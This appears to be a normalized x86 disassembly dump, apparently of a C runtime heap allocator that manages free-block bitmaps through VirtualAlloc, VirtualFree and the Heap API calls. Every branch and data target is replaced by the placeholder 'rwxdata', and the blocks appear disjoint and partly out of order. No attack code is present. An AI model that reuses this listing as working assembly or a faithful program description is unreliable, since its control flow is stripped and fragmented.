jae rwxdata
sub_424ea7
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ ecx + 0x10 ]
push edi
mov edi esi
add esi 0xfffffffc
sub edi [ ecx + 0xc ]
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ecx + esi ]
lea ebx [ ecx + esi ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne rwxdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe rwxdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe rwxdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne rwxdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne rwxdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe rwxdata
mov ecx [ ebp - 0x4 ]
cmp edx 0x20
jae rwxdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ecx + edx * 8 + 0x4 ]
lea ecx [ ecx + edx * 8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne rwxdata
cmp ebx edx
je rwxdata
add ecx [ ebp - 0x8 ]
mov edx ecx
mov [ ebp - 0x4 ] ecx
sar edx 0x4
dec edx
cmp edx esi
jbe rwxdata
mov ebx esi
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne rwxdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne rwxdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne rwxdata
mov cl [ edx + eax + 0x4 ]
cmp edx 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
jae rwxdata
cmp ebx edx
je rwxdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
jmp rwxdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
cmp [ ebp + 0xf ] 0x0
jne rwxdata
cmp [ ebp + 0xf ] 0x0
jne rwxdata
mov esi [ ebp + 0xc ]
jmp rwxdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne rwxdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] edi
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
mov esi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call esi
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rwxdata ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rwxdata ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne rwxdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp rwxdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne rwxdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
jae rwxdata
cmp [ eax + 0x8 ] 0xffffffff
jne rwxdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rwxdata ]
lea ecx [ ebx - 0x20 ]
mov esi 0x80000000
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne rwxdata
mov esi 0x80000000
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne rwxdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rwxdata ]
push [ eax + 0x10 ]
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
mov eax [ rwxdata ]
mov edx [ rwxdata ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rwxdata ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_427650
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rwxdata ]
cmp eax [ rwxdata ]
jbe rwxdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp rwxdata
mov eax [ rwxdata ]
mov [ rwxdata ] eax
sub [ ebp + 0x8 ] 0x14
sub_4251d0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rwxdata ]
mov edx [ rwxdata ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge rwxdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp rwxdata
cmp ebx [ ebp - 0x4 ]
jne rwxdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne rwxdata
mov eax [ rwxdata ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae rwxdata
mov [ rwxdata ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je rwxdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb rwxdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne rwxdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne rwxdata
jne rwxdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne rwxdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je rwxdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne rwxdata
cmp ebx [ ebp - 0x4 ]
jae rwxdata
cmp ebx eax
add ebx 0x14
jmp rwxdata
test ecx ecx
jl rwxdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne rwxdata
cmp [ ebx + 0x8 ] 0x0
jne rwxdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae rwxdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle rwxdata
shl ecx 0x1
inc edi
jmp rwxdata
push ebx
call sub_42558a
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne rwxdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp rwxdata
cmp esi edi
je rwxdata
push 0x3f
pop esi
xor eax eax
jmp rwxdata
jne rwxdata
cmp [ ebx + 0x8 ] 0x0
jne rwxdata
test ecx ecx
je rwxdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
call sub_4254d9
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je rwxdata
cmp ebx eax
add ebx 0x14
jmp rwxdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne rwxdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp rwxdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je rwxdata
cmp edi 0x20
jge rwxdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae rwxdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rwxdata ]
jne rwxdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne rwxdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne rwxdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rwxdata ]
jne rwxdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge rwxdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp rwxdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp rwxdata
and [ rwxdata ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne rwxdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne rwxdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp rwxdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_4254d9
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
push esi
push edi
xor edi edi
cmp eax ecx
jne rwxdata
mov ecx [ rwxdata ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rwxdata ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je rwxdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rwxdata ]
push edi
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je rwxdata
xor eax eax
jmp rwxdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne rwxdata
add [ rwxdata ] 0x10
mov [ rwxdata ] eax
mov eax [ rwxdata ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rwxdata ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rwxdata ]
call [ HeapFree@IAT ]
sub_42558a
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp rwxdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne rwxdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne rwxdata
test eax eax
jl rwxdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja rwxdata
or eax 0xffffffff
jmp rwxdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne rwxdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe rwxdata
sub_425685
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle rwxdata
jge rwxdata
test bl 0x1
jne rwxdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe rwxdata
xor eax eax
jmp rwxdata
add ebx ecx
cmp esi ebx
jg rwxdata
test [ ebp - 0x4 ] 0x1
jne rwxdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe rwxdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne rwxdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe rwxdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne rwxdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae rwxdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne rwxdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
cmp ecx 0x20
jae rwxdata
cmp [ ebp + 0xf ] 0x0
jne rwxdata
cmp [ ebp + 0xf ] 0x0
jne rwxdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe rwxdata
cmp esi 0x20
jae rwxdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe rwxdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne rwxdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne rwxdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp rwxdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne rwxdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne rwxdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne rwxdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp rwxdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp rwxdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp rwxdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae rwxdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp rwxdata
cmp [ ebp + 0x13 ] 0x0
jne rwxdata
cmp [ ebp + 0x13 ] 0x0
jne rwxdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp rwxdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_42597b
cmp [ rwxdata ] 0xffffffff
push ebx
push ebp
push esi
push edi
jne rwxdata
push 0x2020
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je rwxdata
mov esi rwxdata
jmp rwxdata
xor eax eax
mov ebp [ VirtualAlloc@IAT ]
push 0x4
push 0x2000
push __dos_header
push 0x0
call ebp
mov edi eax
test edi edi
je rwxdata
cmp esi rwxdata
je rwxdata
push 0x4
mov ebx 0x10000
push 0x1000
push ebx
push edi
call ebp
test eax eax
je rwxdata
push esi
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov eax rwxdata
cmp esi eax
jne rwxdata
mov [ esi ] eax
mov eax [ rwxdata ]
mov [ esi + 0x4 ] eax
mov [ rwxdata ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
cmp [ rwxdata ] 0x0
jne rwxdata
xor edx edx
cmp ebp 0x10
setge dl
dec edx
and edx ecx
dec edx
inc ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
add eax 0x8
cmp ebp 0x400
jl rwxdata
push ebx
push 0x0
push edi
call sub_422720
add esp 0xc
cmp [ rwxdata ] 0x0
jne rwxdata
mov [ rwxdata ] eax
mov eax esi
jmp rwxdata
or [ edi + 0xf8 ] 0xff
lea eax [ edi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0xf0
add edi 0x1000
jmp rwxdata
lea eax [ edi + __dos_header ]
lea ecx [ esi + 0x98 ]
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
xor ebp ebp
mov ecx 0xf1
mov [ rwxdata ] eax
jmp rwxdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x10 ]
add eax ebx
cmp edi eax
jae rwxdata
sub_425abf
push esi
mov esi [ esp + 0x8 ]
push 0x8000
push 0x0
push [ esi + 0x10 ]
call [ VirtualFree@IAT ]
cmp [ rwxdata ] esi
jne rwxdata
cmp esi rwxdata
je rwxdata
mov eax [ esi + 0x4 ]
mov [ rwxdata ] eax
or [ rwxdata ] 0xffffffff
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push esi
push 0x0
mov [ eax ] ecx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
push [ rwxdata ]
call [ HeapFree@IAT ]
pop esi
retn
sub_425b15
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ rwxdata ]
push edi
cmp esi [ rwxdata ]
je rwxdata
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2010 ]
mov ebx 0x3ff000
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x8 ] 0x0
jg rwxdata
sub ebx 0x1000
sub edi 0x8
test ebx ebx
jge rwxdata
mov eax ebx
push 0x4000
add eax [ esi + 0x10 ]
push 0x1000
push eax
call [ VirtualFree@IAT ]
test eax eax
je rwxdata
cmp [ esi + 0x10 ] 0xffffffff
je rwxdata
cmp [ edi ] 0xf0
jne rwxdata
cmp [ ebp - 0x4 ] 0x0
mov ecx esi
mov esi [ esi + 0x4 ]
je rwxdata
or [ edi ] 0xffffffff
dec [ rwxdata ]
mov eax [ esi + 0xc ]
test eax eax
je rwxdata
cmp [ ecx + 0x18 ] 0xffffffff
jne rwxdata
mov [ esi + 0xc ] edi
cmp eax edi
jbe rwxdata
push 0x1
lea eax [ ecx + 0x20 ]
pop edx
inc [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
je rwxdata
cmp edx 0x400
jne rwxdata
inc edx
add eax 0x8
cmp edx 0x400
jl rwxdata
push ecx
call sub_425abf
pop ecx
cmp [ eax ] 0xffffffff
jne rwxdata
sub_425bd7
mov eax [ esp + 0x4 ]
mov edx rwxdata
push esi
mov ecx edx
mov ecx [ ecx ]
cmp ecx edx
je rwxdata
cmp eax [ ecx + 0x14 ]
jb rwxdata
xor eax eax
pop esi
retn
jmp rwxdata
test al 0xf
jne rwxdata
cmp eax [ ecx + 0x10 ]
jbe rwxdata
mov esi eax
mov edx 0x100
and esi 0xfff
cmp esi edx
jb rwxdata
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov esi [ esp + 0x10 ]
mov ecx eax
and cx 0xf000
sub eax ecx
mov [ esi ] ecx
sub eax edx
pop esi
sar eax 0x4
lea eax [ eax + ecx + 0x8 ]
retn
sub_425c2e
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
sub ecx [ eax + 0x10 ]
sar ecx 0xc
lea eax [ eax + ecx * 8 + 0x18 ]
mov ecx [ esp + 0xc ]
movzx edx [ ecx ]
add [ eax ] edx
and [ ecx ] 0x0
cmp [ eax ] 0xf0
mov [ eax + 0x4 ] 0xf1
jne rwxdata
retn
inc [ rwxdata ]
cmp [ rwxdata ] 0x20
jne rwxdata
push 0x10
call sub_425b15
pop ecx
sub_425c73
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rwxdata ]
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
lea ecx [ esi + 0x2018 ]
mov eax edi
sub eax esi
sub eax 0x18
sar eax 0x3
shl eax 0xc
add eax edx
cmp edi ecx
mov [ ebp - 0x4 ] eax
jae rwxdata
mov eax rwxdata
mov edi eax
jmp rwxdata
mov ebx [ ebp + 0x8 ]
mov ecx [ edi ]
mov ebx [ ebp + 0x8 ]
cmp ecx ebx
jl rwxdata
mov edi [ edi ]
cmp edi eax
je rwxdata
cmp [ edi + 0xc ] 0x0
jne rwxdata
mov edx [ esi + 0x10 ]
